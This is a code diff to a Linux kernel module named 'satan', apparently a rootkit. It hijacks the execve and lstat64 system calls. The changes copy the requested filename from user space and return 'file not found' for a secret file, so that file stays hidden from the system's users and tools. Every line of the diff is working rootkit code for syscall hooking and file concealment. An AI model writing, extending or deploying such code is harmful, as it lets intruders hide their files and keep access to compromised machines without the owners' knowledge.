@@ -4,6 +4,7 @@
 #include <linux/fs.h>
 #include <linux/kallsyms.h>
 #include <linux/module.h>
+#include <linux/uaccess.h>
 
 #include "util.h"
 
@@ -27,7 +28,7 @@ asmlinkage int satan_execve(const char __user *filename,
                             const char __user *const __user *argv,
                             const char __user *const __user *envp)
 {
-        pr_info("satan: hijacked execve(%s, ...)\n", getname(filename)->name);
+        //pr_info("satan: hijacked execve(%s, ...)\n", getname(filename)->name);
         return real_execve(filename, argv, envp);
 }
 
@@ -38,7 +39,12 @@ asmlinkage int (*real_lstat64)(const char __user *filename,
 asmlinkage long satan_lstat64(const char __user *filename,
                               struct stat64 __user *statbuf)
 {
-        if (!strncmp(filename, SECRET_FILE, strlen(SECRET_FILE))) {
+        char buf[256] = {0};
+        strncpy_from_user(buf, filename, 256);
+
+        pr_info("satan: hijacked lstat64(%s, ...)\n", buf);
+
+        if (!strncmp(buf, SECRET_FILE, strlen(SECRET_FILE))) {
                 return -ENOENT;
         }
 
